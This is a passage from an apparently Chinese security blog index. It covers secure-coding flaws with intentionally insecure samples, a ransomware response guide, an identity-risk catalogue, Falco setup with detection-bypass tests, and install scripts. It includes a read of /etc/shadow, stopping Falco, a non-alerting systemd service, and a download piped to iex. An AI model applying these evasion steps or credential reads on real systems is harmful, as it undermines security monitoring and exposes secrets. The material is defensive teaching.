logUserInput(String userInput) &#123; // 安全：对用户输入进行验证和清理 String sanitizedInput = sanitizeInput(userInput); logger.debug(&quot;User input: &#123;&#125;&quot;, sanitizedInput); &#125; private String sanitizeInput(String input) &#123; // 实现具体的输入验证和清理逻辑 // 例如，移除不允许的字符或模式 return input.replaceAll(&quot;[\\r ]&quot;, &quot;_&quot;); &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"系统信息泄露（内部）缺陷 - 腾讯安全代码审计实战系列13","path":"/2025/01/01/appsec/13-系统信息泄露-内部/","content":"系统信息泄露（内部）缺陷 - 腾讯安全代码审计实战系列13将系统内部信息打印到日志、文件或控制台时，可能导致信息泄露。这些信息可能包括数据库连接字符串、操作系统类型、应用程序配置或其他敏感信息，使攻击者能够更容易地对系统进行攻击。 修复建议 避免直接打印程序堆栈。 在抛出异常时不要直接输出详细错误信息，而应使用日志级别控制或错误处理机制来避免泄露敏感信息。 对敏感信息进行脱敏处理后再进行记录或显示。 使用结构化日志记录系统来确保日志仅包含非敏感信息。 定期审查日志内容，以识别并删除潜在泄露信息。 示例代码1234567891011121314151617181920212223class Program&#123; static void Main() &#123; //bad：直接使用 Console.WriteLine 输出敏感信息 string connectionString = &quot;database=northwind;server=mySQLServer...&quot;; Console.WriteLine(connectionString); // 命中漏洞规则 //good：移除敏感信息或使用脱敏处理 Console.WriteLine(&quot;Database connection established.&quot;); // 不泄露敏感信息 //good：记录有限的错误信息，避免敏感信息泄露 try &#123; // 假设这里有可能抛出异常的代码 throw new InvalidOperationException(&quot;Invalid operation detected&quot;); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error occurred: &#123;ex.GetType()&#125; - operation could not be completed.&quot;); // 仅记录有限的非敏感错误信息 &#125; &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"隐私泄露缺陷 - 腾讯安全代码审计实战系列14","path":"/2025/01/01/appsec/14-隐私泄露缺陷/","content":"隐私泄露缺陷 - 腾讯安全代码审计实战系列14隐私泄露发生在用户的敏感信息，如私人信息进入程序后，被错误地记录或传输到不安全的外部位置，例如文件系统、日志或网络。由于程序员对程序运行环境的盲目信任，可能导致这些信息被非授权人员获取。 修复建议 避免将私人信息以明文格式记录在日志或外部文件中。 在必要情况下，使用加密技术存储和传输敏感信息，以保护其隐私和完整性。 实现数据脱敏处理，确保在日志或其他输出中不直接显示敏感信息。 除非出于明确的业务需求，并且采取了适当的保护措施，否则不允许应用程序记录或传输私人信息。 遵循最小授权原则，限制对敏感数据的访问权限，确保只有在职责范围内的人员或进程可以访问。 示例代码12345678910111213141516171819202122232425262728293031//bad：直接将用户信息记录到日志，可能导致隐私泄露public class LoggerBad &#123; public void LogSensitiveData(string username, string password) &#123; string logMessage = $&quot;User Access - Username: &#123;username&#125;, Password: &#123;password&#125;&quot;; System.IO.File.AppendAllText(&quot;logs.txt&quot;, logMessage); // 明文记录敏感信息 &#125;&#125;//good：在记录日志前对敏感信息进行脱敏处理public class LoggerGood &#123; public void LogSensitiveDataWithMasking(string username, string password) &#123; string maskedPassword = new String(&#x27;*&#x27;, password.Length); string logMessage = $&quot;User Access - Username: &#123;username&#125;, Password: &#123;maskedPassword&#125;&quot;; System.IO.File.AppendAllText(&quot;secure_logs.txt&quot;, logMessage); // 使用掩码替代真实密码 &#125;&#125;//good：使用加密技术保护敏感数据后记录public class LoggerWithEncryption &#123; public void LogSensitiveDataEncrypted(string username, string password) &#123; string encryptedPassword = Encrypt(password); // 加密密码 string logMessage = $&quot;User Access - Username: &#123;username&#125;, Password: &#123;encryptedPassword&#125;&quot;; System.IO.File.AppendAllText(&quot;encrypted_logs.txt&quot;, logMessage); // 加密后记录 &#125; private string Encrypt(string data) &#123; // 示例加密方法，实际应用中使用强而有效的加密算法 byte[] dataBytes = System.Text.Encoding.UTF8.GetBytes(data); return Convert.ToBase64String(dataBytes); &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"堆内存隐私信息泄露缺陷 - 腾讯安全代码审计实战系列系列15","path":"/2025/01/01/appsec/15-堆内存隐私信息泄露/","content":"堆内存隐私信息泄露缺陷 - 腾讯安全代码审计实战系列系列15在应用程序中，敏感信息（如密码、密钥或个人身份信息）通常被存储为不可变的String对象。在这种情况下，内存中的敏感数据可能会在不知不觉中泄露。由于String对象是不可变的，它们不能直接被清除或覆盖，只能依赖垃圾收集器来清除内存中的数据。在垃圾收集器运行之前，如果发生内存转储或应用程序崩溃，这些数据就有可能泄露。 修复建议 使用可变的字符数组或字节数组来存储敏感信息，以便在使用之后能够直接清除或覆盖这些数据。 确保在敏感信息不再需要使用时，及时清除或覆盖其所占用的内存空间。 示例代码12345678910111213141516171819202122// bad：使用String存储敏感信息，不可预测何时信息会被清除public void processSensitiveInformation(byte[] secretData, byte[] encryptionKey, byte[] initializationVector) &#123; byte[] decryptedData = AESUtils.decrypt(secretData, encryptionKey, initializationVector); String sensitiveInfo = new String(decryptedData); // 敏感信息以String形式存储 // 使用敏感信息 System.out.println(&quot;Processed: &quot; + sensitiveInfo);&#125;// good：使用char数组存储敏感信息，并及时清除public void processSensitiveInformationSafely(byte[] secretData, byte[] encryptionKey, byte[] initializationVector) &#123; byte[] decryptedData = AESUtils.decrypt(secretData, encryptionKey, initializationVector); char[] sensitiveInfo = new char[decryptedData.length]; for (int i = 0; i &lt; decryptedData.length; i++) &#123; sensitiveInfo[i] = (char) decryptedData[i]; &#125; // 使用敏感信息 try &#123; System.out.println(&quot;Processed: &quot; + new String(sensitiveInfo)); &#125; finally &#123; Arrays.fill(sensitiveInfo, &#x27;\\u0000&#x27;); // 使用完毕后清除信息 &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"勒索病毒-快速应对手册","path":"/2024/06/01/ransomware/","content":"勒索病毒-快速应对手册一、搜索勒索病毒情报信息 直接搜索 文件名后缀： bixi 勒索病毒 搜索360社区， bixi 勒索病毒 360社区 二、解密服务商服务商01 厦门嘉辰信息技术有限公司 https://xmdatasos.com/ 服务商02 91数据恢复 http://www.91huifu.com/ 三、勒索病毒解密工具方法01 360解密大师解 https://lesuobingdu.360.cn/ 若使用360解密大师解密失败，可添加QQ群：522125001进行反馈 方法02 奇安信 天擎勒索解密工具 https://lesuobingdu.qianxin.com/ 勒索病毒搜索引擎：输入病毒名、加密文件后缀名、勒索邮箱、勒索信名，或上传被加密文件，可快速查找到病毒详情和解密工具 天擎勒索解密工具：发现文件遭受勒索病毒加密，不用担心，一键安装天擎勒索解密工具，支持解密100多种勒索病毒。 方法03 综合性解密工具网站 卡巴斯基：勒索软件解密工具集 https://noransom.kaspersky.com/ nomoreransom：勒索软件解密工具集 https://www.nomoreransom.org/zh/index.html 以下是2024常见传播的勒索病毒，表明勒索病毒正在呈现多样化以及变种迅速地态势发展。 后缀hmallox勒索病毒,rmallox勒索病毒,.bixi勒索病毒,.baxia勒索病毒,.jaff勒索病毒,.lcrypt勒索病毒,.faust勒索病毒,.wstop勒索病毒,.stop勒索病毒,.wstop勒索病毒,.DevicData-Z-XXXXXXXX勒索病毒,lockbit3.0勒索病毒,.[[&#x64;&#x61;&#116;&#97;&#x73;&#101;&#x72;&#118;&#x65;&#x72;&#64;&#x61;&#x69;&#114;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#x63;]].stop勒索病毒,[[Fat32@airmail]].wstop勒索病毒,[[BaseData@airmail]].wstop勒索病毒，[[&#x42;&#x69;&#116;&#x43;&#x6c;&#x6f;&#117;&#100;&#x40;&#x63;&#x6f;&#99;&#x6b;&#46;&#108;&#105;]].wstop勒索病毒，.locked勒索病毒,.weibumoneyistime勒索病毒,[&#100;&#x61;&#116;&#x61;&#x73;&#116;&#111;&#114;&#x65;&#x40;&#x63;&#121;&#x62;&#x65;&#114;&#102;&#101;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;].mkp,mkp勒索病毒.Elibe勒索病毒,.[&#x63;&#x6f;&#x6c;&#x6f;&#x6e;&#121;&#57;&#54;&#x40;&#99;&#111;&#x63;&#107;&#46;&#x6c;&#105;].faust勒索病毒,[&#x6e;&#105;&#x63;&#101;&#116;&#x6f;&#x6d;&#101;&#x65;&#116;&#x79;&#x6f;&#x75;&#x40;&#x6f;&#110;&#x69;&#x6f;&#x6e;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#x6f;&#114;&#103;].faust勒索病毒,[&#x64;&#x61;&#x74;&#x61;&#115;&#x74;&#111;&#114;&#x65;&#64;&#x63;&#121;&#x62;&#101;&#x72;&#102;&#x65;&#x61;&#x72;&#x2e;&#x63;&#x6f;&#x6d;].Elbie勒索病毒,.Carver勒索病毒，.Wormhole勒索病毒，.secret勒索病毒，.[&#x73;&#x71;&#108;&#98;&#x61;&#99;&#x6b;&#64;&#109;&#101;&#x6d;&#101;&#119;&#x61;&#x72;&#101;&#46;&#x6e;&#x65;&#x74;].2700勒索病毒，.[&#82;&#101;&#115;&#x74;&#111;&#114;&#x65;&#x42;&#97;&#x63;&#x6b;&#117;&#112;&#x40;&#99;&#x6f;&#99;&#107;&#x2e;&#x6c;&#x69;].SRC勒索病毒，.[&#x63;&#x68;&#101;&#119;&#x62;&#97;&#99;&#99;&#97;&#64;&#99;&#111;&#x63;&#x6b;&#46;&#x6c;&#x69;].SRC勒索病毒,[&#x67;&#105;&#118;&#x65;&#98;&#97;&#99;&#x6b;&#x64;&#x61;&#116;&#x61;&#x40;&#109;&#x61;&#x69;&#108;&#46;&#x72;&#x75;].blue勒索病毒,.kat6.l6st6r勒索病毒,.babyk勒索病毒，.[&#x73;&#116;&#x65;&#x6c;&#x6f;&#106;&#x40;&#98;&#107;&#x2e;&#x72;&#117;].steloj勒索病毒,.moneyistime勒索病毒等。 这些勒索病毒往往攻击入侵的目标基本是Windows系统的服务器，包括一些市面上常见的业务应用软件，例如：金蝶软件数据库，用友软件数据库，管家婆软件数据库，速达软件数据库，科脉软件数据库，海典软件数据库，思迅软件数据库，OA软件数据库，ERP软件数据库，自建网站的数据库等，均是其攻击加密的常见目标文件，所以有以上这些业务应用软件的服务器更应该注意做好服务器安全加固及数据备份工作。","tags":["网络安全","勒索病毒"],"categories":["安全体系"]},{"title":"身份优先安全风险知识库","path":"/2024/02/29/security-architecture/idsec/","content":"img 权威报告研究关于身份风险：网络入侵难以完全杜绝的根本原因在于攻击是通过合法用户凭据发起的，这使得非法攻击看起来就像是普通用户访问一样。 美国 NSA 前监察长曾指出，犯罪分子可以利用在黑市上买来的凭证访问几乎所有机构的信息。 Gartner Top Security and Risk Trends for 2021 - November 15, 2021 Trend No. 4: Identity-first security img 混合工作和向云应用程序的迁移巩固了身份作为安全边界的趋势。身份优先安全并不是个新概念，但随着攻击者开始瞄准身份和访问管理功能以实现长期潜伏，身份优先安全变得更加紧迫。 凭据滥用现在是攻击行为中最常用的技术。国际黑客组织以Active Directory和身份基础设施为目标，取得了惊人的成功。身份是突破物理隔离网络的关键横向移动技术。多因素身份验证(MFA)的使用正在增长，但它不是万能的。企业必须更加重视MFA的正确配置、维护并监控身份基础设施。 Gartner Identifies Top Security and Risk Management Trends for 2022 March 7, 2022 Trend 3: Identity Threat Detection and Response 复杂的威胁参与者正在积极瞄准身份和访问管理 (IAM) 基础设施，而凭据滥用现在是主要的攻击媒介。Gartner 引入了术语“身份威胁检测和响应”(ITDR) 来描述用于保护身份系统的工具和最佳实践的集合。 “组织花费了大量精力来改进 IAM 功能，但其中大部分都集中在改进用户身份验证的技术上，这实际上增加了网络安全基础设施基础部分的攻击面，”Firstbrook 表示：“ITDR 工具可以帮助保护身份系统，检测它们何时受到损害并实现有效的补救。” Gartner Top Security and Risk Trends in 2022 - April 13, 2022 Trend No. 2: Identity system defense 身份系统正受到持续的攻击。滥用凭据现在是攻击者用来访问系统并实现其目标的主要方法。例如，在SolarWinds漏洞中，攻击者使用供应商的特权访问权限来渗透目标网络。 IDSA 2022 数字身份保护趋势报告 (Trends in Securing Digital Identities) 令⼈震惊 84% 的组织在过去一年中经历过与身份相关的泄露事件。最常见的泄露归因是网络钓鱼攻击 (59%)，权限管理不当 (36%) 和凭据被盗 (33%)。 失陷事件通常涉及网络钓鱼和被盗凭据。威胁行为者可以利用这些凭据的访问权限，绕过 IT 限制、窃取数据、部署勒索软件或采取其他恶意行动。 ⼏乎所有安全和身份专家 (97%) 都表示，他们组织将在明年投资于以身份为中心的安全架构。 CSA 2022 云计算面临的主要威胁报告 《SANS 2022 Top New Attacks and Threat Report》 报告调查了 700 名安全专业人士，发现了 19 种与云相关的安全事件最常见的攻击路径，排名第一位的是⾝份、凭据、访问和密钥管理水平不足。 较差的身份安全保护再一次被列为最关键的领域，本质上是阻止网络钓鱼攻击和其他窃取可重复使用密码的尝试的能力。 Microsoft 2022 微软数字防御报告(Microsoft Digital Defense Report) 微软监测数据称，99％ 被入侵的帐户未启用多因素身份验证。目前以多因素认证（MFA）、无密码方案为代表的强身份认证的使用率还很低，而那些仅仅依靠密码保护的账号，常常成为黑客们最容易得手的目标。详情链接 微软安全洞察，身份管理漏洞成为数字安全首要威胁。确保身份认证及管理的安全性是确保数字安全的重中之重。强化身份管理，是应对数字威胁最行之有效又简便易行的手段。详情链接 Verizon 2022 数据泄露调查报告 (Data Breach Investigations Report) 报告称被盗凭据仍然是恶意行为者用来实施数据泄露的第一大黑客策略。黑客入侵导致的数据泄露事件中，超过 60% 涉及丢失、被盗或可破解的凭据或网络钓鱼。 报告指出，目前有四个主要途径会威胁到数据资产：凭证窃取、网络钓鱼、漏洞利用和僵尸网络。 身份和访问管理标准体系 img 风险案例研究2022年度全球数据泄露事件TOP 20 2022年网络攻击事件盘点 2022年数据泄露事件盘点 随着 MFA 多因素认证普及，对抗 MFA 的网络钓鱼即服务 Phishing-as-a-Service (PhaaS) 已经实现产品化，支持针对主流在线服务身份验证令牌的窃取，包括：Apple、Google、Facebook、Microsoft、Twitter、GitHub、GoDaddy。 黑客针对大多数企业的攻击者中，出于经济利益或者政治活动，利用恶意软件和电脑病毒等手段窃取信息，以达到攻击目的。搜狐员工遭遇工资补助诈骗。经调查，实为某员工使用邮件时被意外钓鱼导致密码泄露，进而被冒充财务部盗发邮件。据统计，共有24名员工被骗取4万余元。链接 “内鬼”泄密，公司内部人员因安全意识不足导致泄密，或者前员工有意曝光公司重要数据。知名漏洞众测平台 HackerOne 的一名员工，利用工作职务之便，窃取通过漏洞赏金平台提交的漏洞报告，出售给那些受影响的用户，以此索取现金奖励。据 HackerOne 表示，这名员工联系了7名HackerOne 客户，并在少数披露中获取了赏金。链接 系统漏洞，黑客利用系统上存在的漏洞进入系统并窃取登录凭证后发动网络攻击。有安全研究人员发现，攻击者利用微软 MSHTML 远程代码执行漏洞（CVE-2021-40444），通过PowerShell 恶意软件窃取器，来窃取受害者谷歌和在线服务凭证信息。链接 云通讯巨头Twilio 表示，有攻击者利用短信网络钓鱼攻击窃取了员工凭证，并潜入内部系统泄露了部分客户数据。 美国网约车巨头Uber发生了重大黑客攻击事件，一名黑客获得了Uber一位员工的Slack账号，并获取了该公司在亚马逊和谷歌云计算平台的访问权限。位于旧金山的Uber公司目前已经证实了这次黑客攻击，公司上下正在匆忙评估这次黑客攻击造成的损失。 继三星微软之后Lapsus$黑客组织宣布入侵LG、Okta、Cloudflare。对三星电子、微软、英伟达、沃达丰等巨头发起网络攻击的外国黑客组织Lapsus$宣布，该组织也入侵了LG电子。该组织在Telegram上上传了一份文件，声称这是LG电子员工和服务账户的哈希值。在透露这一消息时，该组织还在其Telegram账号上发布了自称是Okta内部系统的截图，其中一张似乎显示了Okta的Slack频道，另一张是Cloudflare界面。LG电子表示，到目前为止，尚未确认客户相关信息的泄露。 黑客伪造“政府传票”窃取科技巨头敏感数据，苹果、脸书等均受影响。安全博客KrebsOnSecurity披露了一种伪装政府执法部门向互联网公司套取用户数据的攻击手法，攻击者窃取执法部门邮箱等官方账号，向互联网平台发送“紧急数据申请”，从而套取用户敏感数据。最近兴起的LAPSUS$数据勒索团伙正是利用这一手法为基础，成功入侵了微软、Okta、英伟达等知名企业内网窃取数据，苹果、Meta等巨头曾应黑客要求提供用户数据。 黑客用GitHub用户令牌从数十家企业内部系统窃取信息。GitHub安全研究人员报告称，4月12日，一名未知的攻击者使用被盗的Heroku和Travis CI维护的第三方OAuth用户令牌从数十家企业的私有存储库中下载数据。虽然目前尚不清楚究竟有多少企业受到了此次活动的影响，但根据软件供应链保护提供商BluBracket的说法，可以确认的是攻击者“利用了npm私有库中的AWS密钥。”因此，此次曝光的数据泄露不仅限于GitHub，还可能波及集成了Heroku&#x2F;Travis的所有应用程序。 身份优先安全风险清单img 1.账号保护默认账号很多系统都会有默认的账号，比如管理后台都会有个admin、root、system账号，攻击者免去破解账号名称，使用默认账号尝试发起攻击。 账号可枚举攻击者根据应用程序返回的不同的出错信息可枚举出系统中存在的账号信息，然后针对枚举出来的登录用户名，对其密码进行暴力破解。 虚假注册通过使用应用程序的帐户注册流程，提供虚假的身份数据注册账号，利用虚假的身份注册虚假账号便于后续攻击。 验证绕过应用程序在认证上没有做好，可以导致恶意用户或者攻击者绕过认证，访问内部资源。 恶意锁定通过不断的输入错误的密码可恶意锁定任意账号。若系统认证功能无人机识别功能模块，攻击者可编写脚本批量锁定系统账号。 僵尸账号由于各种历史原因，很多账号处于无人使用状态。这种长时间没有登录行为，如果突然在某个时刻再次被使用，很可能是被攻击者掌握。 凭证破解攻击者使用自动化脚本组合出常见的用户名和密码，即字典，再结合高并发破解软件进行暴力破解。 凭证复用很多账户系统在账户改密码之后并不能清除已有的登录状态，导致在盗用或使用 Cookies 的情况之下，可以一直维持对目标用户的登录权限。 2.密码保护弱密码 仅包含简单数字和字母的密码，例如”123”、”abc”等，这样的密码很容易被别人破解。通过爆破工具就可以很容易破解。 默认口令 很多系统都会有出厂的默认密码，攻击者会收集各种类型系统的默认密码，如果管理员没有及时修改默认密码，很可能会被攻击者利用。 万能密码 攻击者可通过万能密码直接登录后台，获取后台权限，构造特殊的 SQL 语句进行截断，造成永真，就可以越过查询完成登录。 撞库攻击 攻击者使用从其他地方窃取的身份验证凭据，通过批量登陆，验证被盗账号密码在当前系统中的有效性。 密码喷射 通过暴力枚举众多账号列表的特定脆弱密码尝试登陆，攻击者将有可能获得当前系统上使用脆弱密码的用户权限。 密码明文泄露 认证过程中用户名密码等敏感数据明文传输，攻击者通过在局域网中嗅探网络流量，获取明文传输的认证凭证，如用户名密码、SESSIONID等敏感信息。 越权修改密码 修改密码处如果没有校验旧密码、短信验证码、存在越权漏洞等问题，导致攻击者可利用该漏洞直接修改其他用户的密码。 忘记密码找回 在未知他人的重置密码链接或手机验证码的情况下，攻击者通过构造重置密码链接或穷举手机验证码的方式直接重置他人的密码。 3.人机识别验证码失效 常见的让验证码失效的方式有把验证码参数值填空，或者验证码参数删掉，系统不再返回验证码错误。 验证码复用 验证码使用多次不失效，攻击者利用这个缺陷来绕过验证码。攻击者多次请求都是使用的同一个验证码，系统返回都请求成功。 验证码伪造 由客户端来生成验证码，或者由客户端来判断验证码，攻击者通过逆向客户端程序，来伪造合法的验证码，绕过验证机制。 文字验证码对抗 主要是通过用户输入图片中的字母、数字、汉字等进行验证。简单易操作，人机交互性较好，但安全系数低，容易被破解。采用OCR技术可轻松破解。 图形验证码对抗 按照指定顺序点击正确的图标，即可完成验证。需按照常用语的顺序点击正确的文字，即可完成验证。 行为验证码对抗 按照要求将备选碎片直线滑动到正确的位置，或拖动滑块移动来达到验证目的。维度单一，容易被逆向模拟。 智能验证码 通过行为特征、设备指纹、数据风控等技术，正常用户免验证，异常用户强制验证。简单便捷，区分人与机器、人与人、设备与设备。 4.多因素保护短信验证爆破 短信验证码位数太短或有效期太长导致可暴力破解，验证码错误次数超过上限应触发短信验证码失效重新发送等保护机制。 邮箱验证爆破 邮箱验证码位数太短或有效期太长导致可暴力破解，验证码错误次数超过上限应触发验证码失效重新发送等保护机制。 动态口令绕过 系统实现存在缺陷，在验证完账号密码后，COOKIE 已经拥有登录态，导致不填入动态口令也可以直接访问后台系统，绕过动态口令认证。 人脸识别对抗 人脸识别技术已得到广泛应用，攻击者使用一段带有用户人脸的视频，或者3D打印的人脸面具，就可以骗过认证系统。 指纹识别对抗 通过采集用户遗留在各种物体表面上的指纹印记，重构出带有纹理沟壑的指纹膜，套在任何人手上，就可以成功骗过一般的指纹识别。 5.协议安全CAS 漏洞 CAS 反序列化命令执行漏洞 OAuth 安全配置 state 参数处理不当，redirect_uri 地址绕过，code 参数泄露 OIDC 安全配置 nonce 参数处理不当、request_uri 参数 SSRF 漏洞 SAML 安全配置 数字签名和加密的加密材料，用于配置远程实体提供的可信加密材料的安全配置文件以及HTTPS连接的验证 LDAP &#x2F; AD 漏洞 LDAP 注入漏洞、Kerberos 协议攻击 JWT 安全算法 弱密钥、密钥泄露、未校验签名、空加密算法 Cookie 安全配置 会话固定、会话泄露、未设置HTTPONLY、未设置SECURE 6.环境安全异常地理位置 用户登录的地理位置产生异常变化 异常时间访问 用户在非常用时段登录成功 终端设备异常 非常用设备、终端补丁加固、终端防病毒、设备安全状态 接入网络异常 办公网、公共网络、家庭网络、移动网络、恶意源地址 进程应用异常 访问敏感数据、窃取凭据、执行恶意命令 敏感高频访问 用户在登录后，在短时间内，连续访问多个不同的系统 7.平台安全网络访问控制 保护网络边界面临的外部攻击。控制网络流量和边界，对网络进行强制隔离，在公司网络中，只允许被授权的服务和协议传输，未经授权的数据包将被自动丢弃。 入侵检测拦截 对成千上万的网络日志等信息进行自动分析处理与深度挖掘，对网络的安全状态进行分析评价，快速感知到网络中的异常事件与整体安全态势。 安全漏洞补丁 采用自动化的漏洞扫描工具定期进行服务器漏洞检测，第一时间进行处理修复，定期进行系统补丁更新，有效保障服务器稳定运行。 事件监控响应 安全事件的收集、归并和过滤。通过安全事件监控整个组织内的 IT 资源，过滤并关联事件，迅速定位安全威胁，并启动安全事件响应。 数据安全传输 数据传输皆受 AES 密钥加密强度的保护，完全满足敏感数据加密传输需求。通过 HTTPS 协议，信息在终端端到云端实现加密传输。 数据加密存储 加密数据存储，使用 KMS 管理密钥，为敏感数据提供可持续的信息保护，实现数据安全保护和控制。","tags":["数据安全","身份安全","ATO"],"categories":["安全体系"]},{"title":"Falco 防御绕过尝试","path":"/2023/09/01/falco/","content":"Falco 快速安装Falco | falcosecurity&#x2F;falco: Cloud Native Runtime Security (github.com) 1234567891011121314151617181920212223242526272829# Tested on an Ubuntu 20.04- https://falco.org/docs/getting-started/try-falco/try-falco-on-ubuntu/# Add Falco repository.curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | \\ sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpgsudo cat &gt;/etc/apt/sources.list.d/falcosecurity.list &lt;&lt;EOFdeb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable mainEOFsudo apt-get update -y# Install kernel headerssudo apt-get install -y dkms make linux-headers-$(uname -r)sudo apt-get install -y dialog# Install the package falco and its dependenciessudo apt-get install -y falco# Verify the Falco installationsudo systemctl status falco# Simulate a suspicious event:sudo cat /etc/shadow &gt; /dev/null# Via journalctlsudo journalctl _COMM=falco -p warning# Via /var/log/syslogsudo grep falco /var/log/syslog Falco 配置文件/etc/falco/falco.yaml1234567# /etc/falco/falco.yaml# 输出到文件，方便测试file_output: enabled: true keep_alive: false filename: /var/log/events.txt Falco 相关环境测试123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# 检查存在 Falco 主机防护/usr/bin/falco/usr/bin/falcoctl/usr/bin/falco-driver-loader/etc/systemd/system/falco.service/etc/falco/falco.yaml/dev/falco0# 检查 Falco 系统服务systemctl list-units | grep falcosystemctl status falcols -l /usr/lib/systemd/system/falco* &gt; falco-bpf.service &gt; falcoctl-artifact-follow.service &gt; falco-custom.service &gt; falco-kmod-inject.service &gt; falco-kmod.service &gt; falco-modern-bpf.service# 检查 Falco 安装包apt show falco &gt; Package: falco &gt; Version: 0.35.1# 测试杀死进程，会重新复活ps aux | grep falcosudo kill -9 PID# 测试使用 systemctl 能够关闭防护systemctl stop falco - 备注：需要 root 权限 - 关闭后不记录日志，服务重新时会产生一条重启日志# 绕过测试创建一个系统服务，不会告警sudo nano /lib/systemd/system/shellscript.service [Unit]Description=My Shell Script[Service]ExecStart=/usr/bin/script.sh[Install]WantedBy=multi-user.targetsudo systemctl daemon-reload sudo systemctl enable shellscript.service sudo systemctl start shellscript.service # Rules 规则分析 Create files below dev # 不要在 /dev 创建文件 DB program spawned process Mkdir binary dirs # 不要修改 二进制文件 Modify binary dirs # 不要修改 二进制目录 Modify Shell Configuration File # 不要修改 Shell 文件 Non sudo setuid Read sensitive file trusted after startup Read sensitive file untrusted Run shell untrusted System procs network activity # 记录所有网络活动 System user interactive Write below binary dir Write below etc # 不要需改 /etc Write below monitored dir Write below rpm database Falcosidekick 快速安装123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# Tested on an Ubuntu 20.04 https://falco.org/docs/getting-started/try-falco/try-falcosidekick-on-ubuntu/# Install a Container Runtimesudo apt install -y docker.io# Create a instance of Redissudo docker run --detach --rm --network=host \\--name redis docker.io/redis/redis-stack-server:latest# Start a Falcosidekick containersudo docker run --detach --rm --network=host \\--env WEBUI_URL=http://localhost:2802 \\--name falcosidekick falcosecurity/falcosidekick:2.27.0# Check Falcosidekick outputsudo docker logs falcosidekick2023/07/16 09:13:01 [INFO] : Falco Sidekick version: 2.27.02023/07/16 09:13:01 [INFO] : Enabled Outputs : [WebUI]2023/07/16 09:13:01 [INFO] : Falco Sidekick is up and listening on :2801# Start Falcosidekick UIsudo docker run --detach --rm --network=host \\--name falcosidekick-ui falcosecurity/falcosidekick-ui# Check Falcosidekick UI outputsudo docker logs falcosidekick-ui2023/07/16 09:17:15 [WARN] : Index does not exist2023/07/16 09:17:15 [WARN] : Create Index2023/07/16 09:17:15 [INFO] : Falcosidekick UI is listening on 0.0.0.0:28022023/07/16 09:17:15 [INFO] : log level is info# Verify all containers are runningsudo docker ps6bf43d19fe7e falcosecurity/falcosidekick-uibcc7aa743beb falcosecurity/falcosidekick:2.27.00dacd307fd91 redis/redis-stack-server:latest# Redirect Falco output# /etc/falco/falco.yaml...json_output: truehttp_output: enabled: true url: http://localhost:2801...# Restart Falco to apply these changes:sudo systemctl restart falco# Generate a suspicious eventsudo cat /etc/shadow &gt; /dev/null# Access the Falcosidekick UI Dashboardhttp://localhost:2802/dashboard# Event Generatorsudo docker run -it --rm falcosecurity/event-generator \\run syscall --loop UI 界面默认配置：http://192.168.x.x:2802/ admin admin image-默认配置 规则 image-规则 日志 image-日志","tags":["网络安全","运行时安全","系统安全"],"categories":["安全体系"]},{"title":"自动化一键安装编程环境","path":"/2023/08/18/onekey-install/","content":"Windows Java 一键安装 CMD 命令1234## 自动化安装脚本 JDK 18curl -o jdk-18_windows-x64_bin.exe https://d6.injdk.cn/oraclejdk/18/jdk-18_windows-x64_bin.exejdk-18_windows-x64_bin.exe /s # 静默安装完成java -version # 需要重新打开一个 CMD 窗口 Windows Python 一键安装 CMD 命令12345678## 自动化安装脚本 Python 3.9curl https://mirrors.huaweicloud.com/python/3.9.10/python-3.9.10-amd64.exe -o python-3.9.10-amd64.exe.\\python-3.9.10-amd64.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0 # 静默安装完成python -V # 需要重新打开一个 CMD 窗口。## 国内镜像源安装第三方包,永久修改pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simplepip config list Windows Golang 一键安装 CMD 命令1234567## 自动化安装脚本 Golang 1.20curl https://studygolang.com/dl/golang/go1.20.6.windows-amd64.msi -o go1.20.6.windows-amd64.msimsiexec /quiet /i go1.20.6.windows-amd64.msi # 注意：文件名不能写路径，写相对路径会报错，参数顺序也要小心## 国内镜像源安装第三方包,永久修改go env -w GO111MODULE=ongo env -w GOPROXY=https://goproxy.cn Windows NodeJS 一键安装 CMD 命令12345678## 自动化安装脚本 Nodejs 18.17curl https://nodejs.org/dist/v18.17.0/node-v18.17.0-x64.msi -o node-v18.17.0-x64.msi## 管理员权限？msiexec /quiet /i node-v18.17.0-x64.msi # 注意：文件名不能写路径，写相对路径会报错，参数顺序也要小心## 国内镜像源安装第三方包,永久修改npm version npm config set registry https://registry.npm.taobao.org Windows SSH 一键安装 CMD 命令12345678910# Search the OpenSSHGet-WindowsCapability -Online | Where-Object Name -like &#x27;OpenSSH*&#x27;# Install the OpenSSH ClientAdd-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0# Install the OpenSSH ServerAdd-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0# Start the sshd serviceStart-Service sshd# OPTIONAL but recommended:Set-Service -Name sshd -StartupType &#x27;Automatic&#x27; Windows Chocolatey 安装chocolatey | chocolatey-install-app 123456789101112131415161718# Step 1 — Opening and Configuring PowerShell (Run as Administrator.)# Use the RemoteSigned execution policy to set the permissions for the current user.Set-ExecutionPolicy -Scope CurrentUser RemoteSignedGet-ExecutionPolicy -List# Step 2 — Installing the Package Manager Chocolatey$script = New-Object Net.WebClient$script | Get-Member# DownloadString method used to display the script and signature in the PowerShell window. Use this method to inspect the script:$script.DownloadString(&quot;https://chocolatey.org/install.ps1&quot;)# After inspecting the script, install Chocolatey by typing the following into PowerShell:iwr https://chocolatey.org/install.ps1 -UseBasicParsing | iexchoco upgrade chocolatey# Step 3 — Installing Appchoco install -y nanochoco install -y golanggo version Linux Golang 一键安装 BASH 命令123456789mkdir -p ~/deploy/ &amp;&amp; cd ~/deploy/wget -q https://studygolang.com/dl/golang/go1.20.6.linux-amd64.tar.gzrm -rf ~/deploy/go &amp;&amp; tar 